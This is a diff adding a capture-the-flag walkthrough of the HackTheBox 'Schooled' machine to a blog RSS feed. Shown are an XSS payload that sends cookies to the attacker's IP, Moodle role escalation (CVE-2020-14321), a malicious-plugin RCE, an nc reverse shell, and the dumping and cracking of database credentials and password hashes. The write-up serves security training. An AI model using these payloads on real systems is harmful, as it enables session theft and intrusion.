@@ -8,6 +8,419 @@
     <lastBuildDate>Thu, 16 Sep 2021 18:22:05 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/gtfobins/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Schooled</title>
+      <link>https://fahmifj.github.io/hackthebox/schooled/</link>
+      <pubDate>Thu, 16 Sep 2021 18:22:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/schooled/</guid>
+      <description>Moodle exploitation using CVEs</description>
+      <content:encoded><![CDATA[<p>Schooled features an instance of Moodle, a popular LMS used by many school institutions. The installed Moodle version is vulnerable to stored XSS in MoodleNet Profile (CVE-2020-25627) and role privilege escalation (CVE-2020-14321). Exploiting the XSS allows me to login as a teacher. The teacher role can be escalated to a manager role to get the site administration capability, thus allowing me to install a malicious plugin to gain interactive shell access to the system. Internal enumeration reveals database credentials which can be used to recover a password from the database. The password is reused by one of the users for SSH login. This user is allowed to install FreeBSD packages with <code>sudo</code> permissions, and it can be exploited to gain root access.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Stealing cookie with XSS</li>
+<li>Moodle exploitation</li>
+<li>Sudo exploitation on <code>pkg</code></li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>Nmap</li>
+<li>Burp Suite</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>A full scan with nmap discovers three open ports: SSH on 22, an Apache web server on port 80 and a service that <code>nmap</code> identifies it as mysqlx.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ nmap -p- --max-rate <span class="m">1000</span> -sV --reason -oA nmap/10-tcp-allport-schooled 10.10.10.234
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-05-17 14:34 EDT
+Nmap scan report <span class="k">for</span> 10.10.10.234
+Host is up, received reset ttl <span class="m">63</span> <span class="o">(</span>0.045s latency<span class="o">)</span>.
+Not shown: <span class="m">65532</span> closed ports
+Reason: <span class="m">65532</span> resets
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl <span class="m">63</span> OpenSSH 7.9 <span class="o">(</span>FreeBSD 20200214<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp    open  http    syn-ack ttl <span class="m">63</span> Apache httpd 2.4.46 <span class="o">((</span>FreeBSD<span class="o">)</span> PHP/7.4.15<span class="o">)</span>
+33060/tcp open  mysqlx? syn-ack ttl <span class="m">63</span>
+<span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>5/17%Time<span class="o">=</span>60A2BA63%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>N
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+Service Info: OS: FreeBSD<span class="p">;</span> CPE: cpe:/o:freebsd:freebsd
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 801.40 seconds
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---schooledhtb">TCP 80 - schooled.htb</h3>
+<p>Port 80 serving a homepage of a school institution.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035709619.png" alt="image-20210518035709619"  /></div>
+</p>
+<p>In the About section, it states that this school has an online learning system using Moodle.</p>
+<p><div class="img-container"><img src="imgs/image-20210518041407775.png" alt="image-20210518041407775"  /></div>
+</p>
+<p>The Teachers section displays the teachers of the school. This can be useful for generating username list.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035931687.png" alt="image-20210518035931687"  /></div>
+</p>
+<p>On the Contact section, there is an input form. The form submit button points to <code>/contact.php</code>, but it returns with 404.</p>
+<p>At the bottom of the site, it reveals an email address and a domain name: <code>schooled.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210518035750397.png" alt="image-20210518035750397"  /></div>
+</p>
+<p>I will update my <code>/etc/hosts</code> with that domain name.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb&#39;</span> &gt;&gt; /etc/hosts/
+</code></pre></div><p>Poking back the site with <code>curl</code> using its domain name reveals that it&rsquo;s the same site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$  curl -s http://10.10.10.234/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://schooled.htb/ <span class="p">|</span> wc -c
+<span class="m">20750</span>
+</code></pre></div><h3 id="subdomain-fuzz">Subdomain Fuzz</h3>
+<p>Enumerating subdomain using <code>gobuster</code> reveals that there is one called <code>moodle.schooled.htb</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ gobuster vhost -u <span class="s1">&#39;http://schooled.htb/&#39;</span> -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> <span class="p">&amp;</span> Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span> Url:          http://schooled.htb/
+<span class="o">[</span>+<span class="o">]</span> Method:       GET
+<span class="o">[</span>+<span class="o">]</span> Threads:      <span class="m">10</span>
+<span class="o">[</span>+<span class="o">]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
+<span class="o">[</span>+<span class="o">]</span> User Agent:   gobuster/3.1.0
+<span class="o">[</span>+<span class="o">]</span> Timeout:      <span class="nv">10s</span>
+<span class="o">===============================================================</span>
+2021/05/17 17:11:00 Starting gobuster in VHOST enumeration <span class="nv">mode</span>
+<span class="o">===============================================================</span>
+Found: moodle.schooled.htb <span class="o">(</span>Status:  200<span class="o">)</span> <span class="o">[</span>Size: 84<span class="o">]</span>
+</code></pre></div><p>I will update <code>/etc/hosts</code> again.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.237 schooled.htb moodle.schooled.htb&#39;</span>
+</code></pre></div><p>And it&rsquo;s different site.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ curl -s http://moodle.schooled.htb/ <span class="p">|</span> wc -c <span class="o">&amp;&amp;</span> curl -s http://schooled.htb <span class="p">|</span> wc -c
+<span class="m">84</span>
+<span class="m">20750</span>
+</code></pre></div><h3 id="tcp-80---moodleschooledhtb">TCP 80 - moodle.schooled.htb</h3>
+<p>Heading to <code>moodle.schooled.htb</code> shows that it&rsquo;s <a href="https://moodle.org/">Moodle LMS</a>, and there are four courses available here.</p>
+<p><div class="img-container"><img src="imgs/image-20210518171919132.png" alt="image-20210518171919132"  /></div>
+</p>
+<p>It allows guest login, but nothing much I can do with that, so I will just register an account.</p>
+<h4 id="account-register">Account Register</h4>
+<p>To register an account I have to use the domain <code>student.schooled.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210518173537504.png" alt="image-20210518173537504"  /></div>
+</p>
+<p>I will change my email domain and login afterwards.</p>
+<p>When I visit the domain <code>student.schooled.htb</code>, it returns the same site as <code>schooled.htb</code>.</p>
+<h4 id="enroll-course">Enroll course</h4>
+<p>Based on the login activity,  Manuel Phillips is the only teacher that seems to be active. So I will enroll to his course (it allows self-enroll).</p>
+<p><div class="img-container"><img src="imgs/image-20210518174336502.png" alt="image-20210518174336502"  /></div>
+</p>
+<p>On the Mathematics course, there are two announcements .</p>
+<p><div class="img-container"><img src="imgs/image-20210518175011420.png" alt="image-20210518175011420"  /></div>
+</p>
+<p>The oldest announcement by Jamie Borham is just a welcome message and the other titled &ldquo;Reminder for joining students&rdquo; by Manuel Phillips is a reminder for the students to set their MoodleNet profiles.</p>
+<p><div class="img-container"><img src="imgs/image-20210518175100601.png" alt="image-20210518175100601"  /></div>
+</p>
+<p>The &ldquo;MoodleNet profile&rdquo; that Manuel Phillips was talking about can be found at <code>Dashboard -&gt; Preferences -&gt; User account -&gt; Edit profile</code> .</p>
+<p><div class="img-container"><img src="imgs/image-20210518183135218.png" alt="image-20210518183135218"  /></div>
+</p>
+<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
+<h4 id="exploit-db">Exploit-DB</h4>
+<p>At that time, I didn&rsquo;t know how to determine the Moodle version, so I started to search the Moodle vulnerabilities on Exploit-DB using keyword <code>Moodle</code> and sorted the results by latest, here are some potential public exploits I found:</p>
+<ul>
+<li>Moodle 3.10.3 - &lsquo;url&rsquo; Persistent Cross Site Scripting =&gt; Need a teacher or an administrator or a manager role.</li>
+<li>Moodle 3.10.3 - &lsquo;label&rsquo; Persistent Cross Site Scripting =&gt; Worth to try.</li>
+</ul>
+<p><div class="img-container"><img src="imgs/image-20210518183748916.png" alt="image-20210518183748916"  /></div>
+</p>
+<h4 id="moodle-security">Moodle Security</h4>
+<p>The other place to look for the Moodle vulnerabilities/security issues is on  <a href="https://moodle.org/security/">https://moodle.org/security/</a>. In there, I find one stored XSS that seems interesting because it contains &ldquo;moodlenetprofile&rdquo; in its title.</p>
+<p><div class="img-container"><img src="imgs/image-20210518220404280.png" alt="image-20210518220404280"  /></div>
+</p>
+<p>Another one that looks promising is the privilege escalation from the teacher role into manager role.</p>
+<p><div class="img-container"><img src="imgs/image-20210520020814806.png" alt="image-20210520020814806"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="access-as-manuel-phillips">Access as Manuel Phillips</h3>
+<h4 id="moodle-cve-2020-25627---stored-xss-via-moodlenet-profile">Moodle CVE-2020-25627 - Stored XSS via MoodleNet profile</h4>
+<p>From the previous enumeration, I remember that Phillips mentioned &lsquo;MoodleNet profile&rsquo;, which actually the hint to the stored XSS (<a href="https://moodle.org/mod/forum/discuss.php?d=410839&amp;__cf_chl_captcha_tk__=pmd_kdXMGLO2gONcgFQGznuXi0NScKF9l4nL1tJSsqrMN4o-1631707461-0-gqNtZGzNAxCjcnBszQhR">CVE-2020-25627</a>) vulnerability affected the MoodleNet profile. XSS attack is typically used to <a href="https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies">steal a user cookie session</a>. So in this case, I&rsquo;m going to steal Manuel Phillips&rsquo;s cookie.</p>
+<p>First, I will setup a netcat listener on port 80, then I will edit my MoodleNet profile (<code>Dashboard &gt; Preferences &gt; User account &gt; Edit profile &gt; MoodleNet profile</code>) and change its value to the following payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span> <span class="nx">iamf</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Image</span><span class="p">();</span> <span class="nx">iamf</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://10.10.14.49/?iamf=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p>Or this one:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="s1">&#39;&lt;img src=&#34;http://10.10.14.49/?iamf=&#39;</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">+</span> <span class="s1">&#39;&#34; /&gt;&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210520012522733.png" alt="image-20210520012522733"  /></div>
+</p>
+<p>After a few minutes, there is a request coming to my listener:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.49» 
+$ nc -nvlp <span class="m">80</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
+connect to <span class="o">[</span>10.10.14.49<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.234<span class="o">]</span> <span class="m">26076</span>
+GET /?iamf<span class="o">=</span><span class="nv">MoodleSession</span><span class="o">=</span>40mch0eki9ko6kpe03kq36cd97 HTTP/1.1
+Host: 10.10.14.49
+User-Agent: Mozilla/5.0 <span class="o">(</span>X11<span class="p">;</span> FreeBSD amd64<span class="p">;</span> rv:86.0<span class="o">)</span> Gecko/20100101 Firefox/86.0
+Accept: image/webp,*/*
+Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Referer: http://moodle.schooled.htb/moodle/user/profile.php?id<span class="o">=</span><span class="m">33</span>
+</code></pre></div><p>I will update my <code>MoodleSession</code> to the one I obtained from XSS.</p>
+<p><div class="img-container"><img src="imgs/image-20210520013212895.png" alt="image-20210520013212895"  /></div>
+</p>
+<p>When I refresh the page, I&rsquo;m now logged in as Manuel Phillips.</p>
+<p><div class="img-container"><img src="imgs/image-20210915212643838.png" alt="image-20210915212643838"  /></div>
+</p>
+<p>Now I can confirm that this Moodle version is 3.9 by visiting <code>http://moodle.schooled.htb/moodle/user/view.php?id=24&amp;course=5</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915213438687.png" alt="image-20210915213438687"  /></div>
+</p>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="moodle-cve-2020-14321---teacher-role---manager-role">Moodle CVE-2020-14321 - Teacher role -&gt; Manager role</h4>
+<p>This Moodle version is known to be vulnerable to the role privilege escalation (<code>CVE-2020-14321</code>) that allows escalation of privilege from teacher role (Manuel Phillips has teacher role) to manager role. With manager role, it is also possible to obtain code execution by installing a malicious plugin. I will be using this <a href="https://vimeo.com/441698193">walkthrough video</a> created by the researcher who found this vulnerability as my reference.</p>
+<p>The first step is to join a teacher to my course.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022325198.png" alt="image-20210520022325198"  /></div>
+</p>
+<p>I will choose Jamie Borham and enroll it to my course.</p>
+<p><div class="img-container"><img src="imgs/image-20210520022826655.png" alt="image-20210520022826655"  /></div>
+</p>
+<p>I will intercept the enroll request using Burp Suite and modify the <code>userslist</code> parameter to 24 (UserID of Phillips) then the <code>roletoassign</code> parameter to 1.</p>
+<p><div class="img-container"><img src="imgs/image-20210520023902707.png" alt="image-20210520023902707"  /></div>
+</p>
+<p>On the course participants, I can see the manager role has been assigned to Phillips.</p>
+<p><div class="img-container"><img src="imgs/image-20210915214751404.png" alt="image-20210915214751404"  /></div>
+</p>
+<p>With manager role, I have the ability to impersonate my participants (they have to be on my course first) using &ldquo;Login as&rdquo; function. For example:</p>
+<p><div class="img-container"><img src="imgs/image-20210520032135611.png" alt="image-20210520032135611"  /></div>
+</p>
+<p>When I logged in as Lianne Carter, there is another menu called &ldquo;Site Administration&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210915221840588.png" alt="image-20210915221840588"  /></div>
+</p>
+<h4 id="malicious-plugin">Malicious Plugin</h4>
+<p>Now to get RCE, I need to grant full permissions to manager role (from my understanding, Lianne Carter has site administrative capability and manager role).</p>
+<p>I will head to <code>Site Administration</code> -&gt; <code>Users</code> -&gt; <code>Define roles</code> -&gt; <code>Manager</code> -&gt;  <code>Edit</code> to grant full permission to manager role.</p>
+<p><div class="img-container"><img src="imgs/image-20210915222952344.png" alt="image-20210915222952344"  /></div>
+</p>
+<p>Then I will just click on <code>Save changes</code> button and intercept its request.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223616445.png" alt="image-20210915223616445"  /></div>
+</p>
+<p>Except the <code>sesskey</code> parameter, I will change all the parameters with this <a href="https://github.com/HoangKien1020/CVE-2020-14321#payload-to-full-permissions">PoC</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915223955951.png" alt="image-20210915223955951"  /></div>
+</p>
+<p>Now I can install a malicious plugin by accessing <code>Site Administration</code> -&gt; <code>Plugins</code> -&gt; <code>Install plugins</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915224410922.png" alt="image-20210915224410922"  /></div>
+</p>
+<p>I will grab the malicious plugin from this repository: <a href="https://github.com/HoangKien1020/Moodle_RCE">https://github.com/HoangKien1020/Moodle_RCE</a>.</p>
+<p><div class="img-container"><img src="imgs/image-20210915225327871.png" alt="image-20210915225327871"  /></div>
+</p>
+<p>I will just continue on the installation process.</p>
+<p><div class="img-container"><img src="imgs/image-20210915230537390.png" alt="image-20210915230537390"  /></div>
+</p>
+<p>Once the plugin is installed, it can be accessed at <code>http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=[command]</code>:</p>
+<p><div class="img-container"><img src="imgs/image-20210520034807810.png" alt="image-20210520034807810"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>Since it&rsquo;s FreeBSD, I will use the mkfifo payload to get a foothold.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mkfifo /tmp/lol;nc 10.10.14.49 53 0&lt;/tmp/lol | /bin/sh -i 2&gt;&amp;1 | tee /tmp/lol
+</code></pre></div><p>On my listener:</p>
+<p><div class="img-container"><img src="imgs/image-20210520041503270.png" alt="image-20210520041503270"  /></div>
+</p>
+<p>I will upgrade my shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/python3 -c <span class="s2">&#34;import pty;pty.spawn(&#39;/bin/sh&#39;)&#34;</span>
+$ <span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+$ which stty
+which stty
+/bin/stty
+$ ^Z
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> suspended  nc -nvlp <span class="m">53</span>
+→ root@kali «exploits» «10.10.14.49» 
+$ stty raw -echo<span class="p">;</span> <span class="nb">fg</span>
+<span class="o">[</span>1<span class="o">]</span>  + <span class="m">4974</span> continued  nc -nvlp <span class="m">53</span>
+
+$ ls -l
+total <span class="m">0</span>
+$ ls -la
+total <span class="m">0</span>
+$ <span class="nb">pwd</span>
+/usr/local/www/apache24/data/moodle/blocks/rce/lang/en
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-jamie">Shell as jamie</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There are two users other than root who have a login shell: <strong>jamie</strong> and <strong>steve</strong>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:*:0:0:Charlie <span class="p">&amp;</span>:/root:/bin/csh
+jamie:*:1001:1001:Jamie:/home/jamie:/bin/sh
+steve:*:1002:1002:User <span class="p">&amp;</span>:/home/steve:/bin/csh
+$ ls -l /home/
+total <span class="m">17</span>
+drwx------  <span class="m">2</span> jamie  jamie  <span class="m">11</span> Feb <span class="m">28</span> 18:13 jamie
+drwx------  <span class="m">5</span> steve  steve  <span class="m">14</span> Mar <span class="m">17</span> 14:05 steve
+</code></pre></div><p>The Moodle configuration file is located under <code>/usr/local/www/apache24/data/moodle</code>, and it contains database credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ cat config.php 
+&lt;?php  // Moodle configuration file
+
+unset<span class="o">(</span><span class="nv">$CFG</span><span class="o">)</span><span class="p">;</span>
+global <span class="nv">$CFG</span><span class="p">;</span>
+<span class="nv">$CFG</span> <span class="o">=</span> new stdClass<span class="o">()</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;dbtype    <span class="o">=</span> <span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dblibrary <span class="o">=</span> <span class="s1">&#39;native&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbhost    <span class="o">=</span> <span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbname    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbuser    <span class="o">=</span> <span class="s1">&#39;moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dbpass    <span class="o">=</span> <span class="s1">&#39;PlaybookMaster2020&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;prefix    <span class="o">=</span> <span class="s1">&#39;mdl_&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dboptions <span class="o">=</span> array <span class="o">(</span>
+  <span class="s1">&#39;dbpersist&#39;</span> <span class="o">=</span>&gt; 0,
+  <span class="s1">&#39;dbport&#39;</span> <span class="o">=</span>&gt; 3306,
+  <span class="s1">&#39;dbsocket&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;&#39;</span>,
+  <span class="s1">&#39;dbcollation&#39;</span> <span class="o">=</span>&gt; <span class="s1">&#39;utf8_unicode_ci&#39;</span>,
+<span class="o">)</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;wwwroot   <span class="o">=</span> <span class="s1">&#39;http://moodle.schooled.htb/moodle&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;dataroot  <span class="o">=</span> <span class="s1">&#39;/usr/local/www/apache24/moodledata&#39;</span><span class="p">;</span>
+<span class="nv">$CFG</span>-&gt;admin     <span class="o">=</span> <span class="s1">&#39;admin&#39;</span><span class="p">;</span>
+
+<span class="nv">$CFG</span>-&gt;directorypermissions <span class="o">=</span> 0777<span class="p">;</span>
+
+require_once<span class="o">(</span>__DIR__ . <span class="s1">&#39;/lib/setup.php&#39;</span><span class="o">)</span><span class="p">;</span>
+
+// There is no php closing tag in this file,
+// it is intentional because it prevents trailing whitespace problems!
+</code></pre></div><h4 id="mysql">MySQL</h4>
+<p>MySQL binary cannot be resolved, but it&rsquo;s available at <code>/usr/local/bin</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ /usr/local/bin/mysql moodle -u moodle -p<span class="s1">&#39;PlaybookMaster2020&#39;</span>
+mysql: <span class="o">[</span>Warning<span class="o">]</span> Using a password on the <span class="nb">command</span> line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span>.
+Your MySQL connection id is <span class="m">7517</span>
+Server version: 8.0.23 Source distribution
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2021, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type <span class="s1">&#39;help;&#39;</span> or <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> help. Type <span class="s1">&#39;\c&#39;</span> to clear the current input statement.
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>Table <code>mdl_users</code> holds all the Moodle user credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; <span class="k">select</span> username,password from mdl_user<span class="p">;</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> username          <span class="p">|</span> password                                                     <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="p">|</span> guest             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$u8DkSWjhZnQhBk1a0g1ug</span>.x79uhkx/sa7euU8TI4FX4TCaXK6uQk2 <span class="p">|</span>
+<span class="p">|</span> admin             <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW <span class="p">|</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="p">|</span> iamf              <span class="p">|</span> <span class="nv">$2</span>y<span class="nv">$10$GTtFW8Rpm8jnLJ1YmpTBy</span>.rmhwTjdWfc9mR6/jC87WtvCK6CgVOXy <span class="p">|</span>
++-------------------+--------------------------------------------------------------+
+<span class="m">33</span> rows in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
+
+moodle@localhost <span class="o">[</span>moodle<span class="o">]</span>&gt; 
+</code></pre></div><p>There are a lot of hashes to recover, but I will focus on the admin hash first.</p>
+<h4 id="hash-crack">Hash crack</h4>
+<p>Hashcat recovers the admin password to <code>!QAZ2wsx</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ hashcat.exe -m <span class="m">3200</span> <span class="s1">&#39;$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:&#39;</span> rockyou.txt
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+<span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW:!QAZ2wsx
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Name........: bcrypt <span class="nv">$2</span>*$, Blowfish <span class="o">(</span>Unix<span class="o">)</span>
+Hash.Target......: <span class="nv">$2</span>y<span class="nv">$10$3</span>D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5G...l4qTiW
+Time.Started.....: Thu May <span class="m">20</span> 05:04:20 <span class="m">2021</span> <span class="o">(</span><span class="m">1</span> min, <span class="m">25</span> secs<span class="o">)</span>
+Time.Estimated...: Thu May <span class="m">20</span> 05:05:45 <span class="m">2021</span> <span class="o">(</span><span class="m">0</span> secs<span class="o">)</span>
+Guess.Base.......: File <span class="o">(</span>../rockyou.txt<span class="o">)</span>
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+</code></pre></div><h4 id="password-spray">Password Spray</h4>
+<p>With password spray attack, it reveals that the password is reused by user <strong>jamie</strong> for SSH login.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «schooled» «10.10.14.49» 
+$ crackmapexec ssh 10.10.10.234 -u users.list -p passwords.list --continue-on-success
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>*<span class="o">]</span> SSH-2.0-OpenSSH_7.9 FreeBSD-20200214
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> root:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> jamie:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>+<span class="o">]</span> jamie:!QAZ2wsx 
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:PlaybookMaster2020 Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+SSH         10.10.10.234    <span class="m">22</span>     10.10.10.234     <span class="o">[</span>-<span class="o">]</span> steve:!QAZ2wsx Bad authentication type<span class="p">;</span> allowed types: <span class="o">[</span><span class="s1">&#39;publickey&#39;</span>, <span class="s1">&#39;keyboard-interactive&#39;</span><span class="o">]</span>
+</code></pre></div><h4 id="ssh">SSH</h4>
+<p>Now I can login as jamie via SSH.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">→ root@kali «schooled» «10.10.14.49» 
+$ ssh jamie@10.10.10.234
+Password <span class="k">for</span> jamie@Schooled:
+Last login: Tue Mar <span class="m">16</span> 14:44:53 <span class="m">2021</span> from 10.10.14.5
+FreeBSD 13.0-BETA3 <span class="o">(</span>GENERIC<span class="o">)</span> <span class="c1">#0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021</span>
+
+...<span class="o">[</span>SNIP<span class="o">]</span>...
+
+jamie@Schooled:~ $ id
